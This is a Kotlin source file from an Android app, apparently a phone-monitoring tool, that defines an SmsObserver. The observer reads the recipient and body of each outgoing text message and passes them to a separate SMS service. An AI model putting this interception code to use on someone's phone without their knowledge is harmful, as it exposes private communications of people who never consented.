package com.virajbhartiya.pyxis.services.sms

import android.content.Context
import android.database.ContentObserver
import android.database.Cursor
import android.net.Uri
import android.os.Handler
import android.provider.Telephony
import com.virajbhartiya.pyxis.data.preference.DataSharePreference.typeApp
import com.virajbhartiya.pyxis.utils.ConstFun.startServiceSms
import com.virajbhartiya.pyxis.utils.Consts.TAG
import com.virajbhartiya.pyxis.utils.Consts.TYPE_SMS_OUTGOING
import com.pawegio.kandroid.e


class SmsObserver(private val context: Context,handler: Handler) : ContentObserver(handler) {

    override fun onChange(selfChange: Boolean, uri: Uri?) {
        super.onChange(selfChange, uri)
        var cur : Cursor?=null
        try {
            cur = uri?.let { context.contentResolver.query(it,null,null,null,null) }
            cur?.moveToFirst()
            val protocol = cur?.getString(cur.getColumnIndex(Telephony.Sms.PROTOCOL))
            val address = cur?.getString(cur.getColumnIndex(Telephony.Sms.ADDRESS))
            val body = cur?.getString(cur.getColumnIndex(Telephony.Sms.BODY))
            if (protocol == null) {
                if (!context.typeApp) address?.let {
                    if (body != null) {
                        context.startServiceSms<SmsService>(it,body, TYPE_SMS_OUTGOING)
                    }
                }
            }
        }catch (t:Throwable){ e(TAG,t.message.toString()) }
        finally { cur?.close() }
    }

}